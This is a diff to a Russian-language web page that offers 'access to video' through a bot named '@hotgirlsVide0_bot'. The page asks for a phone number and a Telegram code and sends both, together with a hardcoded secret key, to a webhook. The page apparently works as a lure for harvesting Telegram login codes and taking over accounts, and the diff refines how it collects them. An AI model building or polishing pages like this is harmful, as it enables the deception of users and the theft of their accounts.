@@ -303,16 +303,27 @@
             color: #8e9399;
             font-size: 13px;
         }
+
+        .telegram-icon {
+            background: #3390ec;
+            color: white;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            margin: 0 auto 16px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="telegram-badge">
-                Telegram Авторизация
-            </div>
-            <h1>📹 Доступ к видео</h1>
-            <p>Подтвердите номер через Telegram</p>
+            <div class="telegram-icon">📱</div>
+            <h1>Доступ к видео</h1>
+            <p>Код придет в Telegram</p>
         </div>
 
         <!-- Индикатор шагов -->
@@ -325,7 +336,7 @@
 
         <!-- Информация о пользователе -->
         <div class="user-info" id="userInfo">
-            🔍 Загрузка данных...
+            🔍 Проверка сессии...
         </div>
 
         <!-- ШАГ 1: Ввод номера -->
@@ -338,6 +349,10 @@
             <button class="btn" onclick="sendCode()" id="sendBtn">
                 <span>📨 Получить код в Telegram</span>
             </button>
+            
+            <div class="link">
+                <a href="#" onclick="window.open('https://t.me/your_bot', '_blank'); return false;">📱 Открыть Telegram</a>
+            </div>
         </div>
 
         <!-- ШАГ 2: Ввод 4-значного кода -->
@@ -352,7 +367,7 @@
                 </div>
             </div>
             
-            <div class="timer" id="timer">02:00</div>
+            <div class="timer" id="timer">05:00</div>
             
             <button class="btn" onclick="verifyCode()" id="verifyBtn">
                 <span>✓ Подтвердить код</span>
@@ -376,11 +391,11 @@
             </a>
         </div>
 
-        <!-- Статус сообщения -->
+        <!-- Статус сообщение -->
         <div class="status-message" id="statusMessage"></div>
         
         <div class="footer">
-            Код будет отправлен в Telegram бота
+            Код будет отправлен в Telegram бота @your_bot
         </div>
     </div>
 
@@ -396,50 +411,60 @@
         const CONFIG = {
             secretKey: "fjjpdkwo2oj329f93u824f8j3h7yfh28372dug238d7",  // Должен совпадать с config.py
             webhookUrl: "http://localhost:8080/webhook",
-            botUsername: "your_bot"  // Имя вашего бота
+            botUsername: "@hotgirlsVide0_bot"  // Имя вашего бота
         };
 
         // Параметры из URL
         const urlParams = new URLSearchParams(window.location.search);
-        const userCode = urlParams.get('code');
         const userId = urlParams.get('user_id');
 
         // Данные пользователя
         let userData = {
             phone: '',
             userId: userId,
-            code: userCode,
-            telegramCode: ''
+            code: ''
         };
 
         // Таймер
         let timerInterval;
-        let timeLeft = 120;
+        let timeLeft = 300; // 5 минут в секундах
 
         // При загрузке страницы
         window.onload = function() {
             formatPhoneInput();
             setupCodeInputs();
-            
-            // Показываем информацию о пользователе
-            updateUserInfo();
-            
-            // Если есть код и user_id, показываем шаг 2
-            if (userId) {
-                document.getElementById('step1').classList.remove('active');
-                document.getElementById('step2').classList.add('active');
-                updateStepIndicators(2);
-                startTimer();
-            }
+            checkSession();
         };
 
-        // Обновление информации о пользователе
-        function updateUserInfo() {
-            const infoEl = document.getElementById('userInfo');
-            if (userId) {
-                infoEl.innerHTML = `✅ Telegram ID: <strong>${userId}</strong><br>Код авторизации: <strong>${userCode || 'не указан'}</strong>`;
-            } else {
-                infoEl.innerHTML = '⚠️ Для начала нажмите /start в боте Telegram';
+        // Проверка существующей сессии
+        async function checkSession() {
+            if (!userId) {
+                document.getElementById('userInfo').innerHTML = '❌ Ошибка: нет Telegram ID. Нажмите /start в боте';
+                return;
+            }
+
+            try {
+                const response = await fetch(CONFIG.webhookUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        action: 'check_session',
+                        user_id: userId,
+                        secret_key: CONFIG.secretKey
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success && data.has_session) {
+                    document.getElementById('userInfo').innerHTML = `✅ У вас уже есть доступ!<br>Телефон: ${data.phone}`;
+                    // Можно сразу показать шаг 3
+                    goToStep(3);
+                } else {
+                    document.getElementById('userInfo').innerHTML = `✅ Telegram ID: ${userId}<br>Введите номер телефона`;
+                }
+            } catch (error) {
+                document.getElementById('userInfo').innerHTML = `✅ Telegram ID: ${userId}`;
             }
         }
 
@@ -499,7 +524,7 @@
                     }
                     
                     if (value.length > 1) {
-                        e.target.value = '+7 ' + value.substring(1);
+                        e.target.value = '+7 ' + value.substring(1).replace(/(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4');
                     } else {
                         e.target.value = '+7';
                     }
@@ -543,7 +568,7 @@
 
         // Таймер
         function startTimer() {
-            timeLeft = 120;
+            timeLeft = 300; // 5 минут
             updateTimerDisplay();
             
             timerInterval = setInterval(() => {
@@ -590,7 +615,7 @@
         // ШАГ 1: Отправка кода
         async function sendCode() {
             if (!userId) {
-                showStatus('Сначала нажмите /start в боте Telegram', 'error');
+                showStatus('Ошибка: нет Telegram ID. Нажмите /start в боте', 'error');
                 return;
             }
 
@@ -608,17 +633,16 @@
             // Показываем загрузку
             const btn = document.getElementById('sendBtn');
             btn.disabled = true;
-            btn.innerHTML = '<span class="loading"></span> Отправка...';
+            btn.innerHTML = '<span class="loading"></span> Отправка кода...';
 
             try {
                 // Отправляем запрос на отправку кода
                 const result = await sendToBot('send_code', {
-                    phone: phone,
-                    username: 'web_user'
+                    phone: phone
                 });
 
                 if (result.success) {
-                    showStatus('✅ Код отправлен в Telegram! Проверьте бота.', 'success');
+                    showStatus('✅ Код отправлен в Telegram! Проверьте чат с ботом.', 'success');
                     stopTimer();
                     startTimer();
                     goToStep(2);
@@ -661,7 +685,6 @@
             try {
                 // Отправляем код на проверку
                 const result = await sendToBot('verify_code', {
-                    phone: userData.phone,
                     code: enteredCode
                 });
 
@@ -712,6 +735,11 @@
                     verifyCode();
                 }
             }
+        });
+
+        // Обновляем ссылки на бота
+        document.querySelectorAll('a[href*="your_bot"]').forEach(el => {
+            el.href = `https://t.me/${CONFIG.botUsername}`;
         });
     </script>
 </body>
